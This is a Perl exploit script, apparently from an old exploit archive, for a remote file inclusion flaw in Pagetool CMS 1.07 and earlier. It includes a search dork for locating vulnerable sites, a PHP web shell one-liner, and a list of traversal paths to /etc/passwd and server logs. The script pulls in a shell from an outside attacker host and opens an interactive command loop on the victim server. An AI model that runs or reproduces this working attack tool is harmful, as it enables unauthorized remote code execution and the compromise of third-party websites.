#!usr/bin/perl
use LWP::UserAgent;
####################################################################
#          ___   ___                         _
#         / _ \ / _ \                       | |
#     __ _| | | | | | |_ __  ___   _ __   ___| |_
#   / _` | | | | | | | '_ \/ __| | '_ \ / _ \ __|
#  | (_| | |_| | |_| | | | \__ \_| | | |  __/ |_
#   \__, |\___/ \___/|_| |_|___(_)_| |_|\___|\__|
#    __/ |
#   |___/
#
#===========================INFO====================================
# Impact level: HIGH
#
# Google: powered by pagetool or Pagetool Development Team
#
# browser use:
# http://[ site ]/src/admin/pt_upload.php?config_file=[local server file]&ptconf[src]=[ shell ]?
#
#=========================VULN CODE=================================
# Code:
#
# if (file_exists($config_file))
#{
#     include($config_file);
#
#    ...
#      include($ptconf["src"] . "pagetool/pt_profile.inc");
#      include($ptconf["src"] . "pagetool/pt_functions.inc");
#===================================================================
#
#  Vulnerability Found by: FiSh and godXcel
#
#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
                    #---Exploit---#
#==========================================================#
#         [Pagetool CMS <=1.07 (RFI)]
#    [c]oded by TrinTiTTy -at- g00ns.net
#==========================================================#
#
#    ! Vulnerability by FiSh and godXcel !
#
# Shoutz: z3r0, clorox, wicked, synical, ReZEN, grumpy,
#         SiCK, and everyone else at g00ns.net
#
#    greetz: 13337.org, acircle.us
#
# www.g00ns.net | irc.g00ns.net #g00ns | www.g00ns-forum.net
#
#      #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
#      # Notes:                                     #
#      # Shell example <?passthru($_GET[cmd]);?>    #
#      # Shell variable: ($_GET[cmd]);              #
#      #=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
#==========================================================#

$host = @ARGV[0]; $shell = @ARGV[1];

if ($host =~ /http:\/\// || $shell =~ /http:\/\//)
   {print "\n\n [-] Don't include http:// in your links!\n";usage();exit();}
elsif (@ARGV != 2) {head();usage();exit();}
head();
print "\n [!] Scanning for local server config file\n\n [!] Be patient...\n";

# No credz to me for below list..
@cfgs = ("/etc/passwd",
         "../apache/logs/error.log",
         "../../../../apache/logs/access.log",
         "../apache/logs/access.log",
         "../../../../../var/log/httpd/error_log",
         "../../apache/logs/error.log",
         "../../apache/logs/access.log",
         "../../../apache/logs/error.log",
         "../../../apache/logs/access.log",
         "../../../../apache/logs/error.log",
         "../../../../../apache/logs/error.log",
         "../../../../../apache/logs/access.log",
         "../logs/error.log",
         "../logs/access.log",
         "../../logs/error.log",
         "../../logs/access.log",
         "../../../logs/error.log",
         "../../../logs/access.log",
         "../../../../logs/error.log",
         "../../../../logs/access.log",
         "../../../../../logs/error.log",
         "../../../../../logs/access.log",
         "../../../../../etc/httpd/logs/access_log",
         "../../../../../etc/httpd/logs/access.log",
         "../../../../../etc/httpd/logs/error_log",
         "../../../../../etc/httpd/logs/error.log",
         "../../../../../var/www/logs/access_log",
         "../../../../../var/www/logs/access.log",
         "../../../../../usr/local/apache/logs/access_log",
         "../../../../../usr/local/apache/logs/access.log",
         "../../../../../var/log/apache/access_log",
         "../../../../../var/log/apache/access.log",
         "../../../../../var/log/access_log",
         "../../../../../var/www/logs/error_log",
         "../../../../../var/www/logs/error.log",
         "../../../../../usr/local/apache/logs/error_log",
         "../../../../../usr/local/apache/logs/error.log",
         "../../../../../var/log/apache/error_log",
         "../../../../../var/log/apache/error.log",
         "../../../../../var/log/access_log",
         "../../../../../var/log/error_log");
scan();
sub scan(){
  for ($i = 0; $i <=40; ++$i){
  $ag3nt = LWP::UserAgent->new() || die;
  $inc = "http://".$host."/src/admin/pt_upload.php?config_file=".$cfgs[$i]."&ptconf[src]=http://".$shell."?";
  $response = $ag3nt->get($inc);
  syswrite STDOUT,".";
  $ans = $response->content;
    if( $ans =~ /500 Server closed connection without sending any data back/)
       {print "\n\n [-] Couldn't Include Shell...better luck next time.\n\n";exit;}
    elsif ($ans =~ /Cannot execute a blank command/)
       {print "\n [+] Server File: FOUND\n\n [+] Executing Command Shell...\n\nType quit to exit shell\n";commands();}}}
print "\n\n [-] Couldn't find valid config file...better luck next time\n\n";exit;

sub commands(){
print "\nshell\@box \$~ ";
  $nix=<STDIN>;
  chomp($nix);
if ($nix =~ /quit/gmi){print "\n [-] Good Bye\n";exit();}
$ag3nt = LWP::UserAgent->new() || die;
$inc = "http://".$host."/src/admin/pt_upload.php?config_file=".$cfgs[$i]."&ptconf[src]=http://".$shell."?cmd=".$nix.'%00';
$response = $ag3nt->get($inc);
$ans = $response->content;
if ($ans =~ /<b>Warning<\/b>:/gmi || $ans =~ /<a href=/gmi)
   {print " \n[-] ERROR: Bad command, permissions, website, or shell.\n";commands();}
else {print "\n$ans";commands();}}

sub head(){
 print q {
   |======================================================|
   |               Pagetool CMS <=1.07 (RFI)              |
   |         [c]oded by TrinTiTTy -at- g00ns.net          |
   | -----------------------------------------------------|
   |                                                      |
   |          Vulnerability by FiSh and godXcel           |
   |            greetz: 13337.org, acircle.us             |
   |                                                      |
   |                   www.g00ns.net                      |
   |======================================================|
   }}
sub usage(){
 print q{
 Usage: perl pagetool07.pl <host> <shell location>

 Example: perl pagetool07.pl www.victim.net www.shellsite.com/shell.txt
   }
 }

# milw0rm.com [2006-12-24]
